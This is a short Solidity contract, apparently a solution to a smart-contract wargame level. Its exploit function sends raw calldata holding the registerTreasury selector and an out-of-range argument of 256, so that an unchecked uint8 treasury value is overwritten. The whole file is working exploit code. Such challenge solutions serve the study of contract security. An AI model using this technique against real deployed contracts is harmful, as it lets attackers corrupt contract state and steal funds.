pragma solidity ^0.6.12;

contract AttackHigherOrderFixed {
    address public immutable instance;

    constructor(address _instance) public {
        instance = _instance;
    }

    function exploit() external {
        // Correct function selector for registerTreasury(uint8) is 0xab3bfe6a
        bytes memory payload = abi.encodePacked(
            bytes4(0xab3bfe6a),
            hex"0000000000000000000000000000000000000000000000000000000000000100"
        );
        // Send direct call to set treasury = 256
        (bool success, ) = instance.call{gas: 100000}(payload);
        require(success, "Exploit failed");
    }
}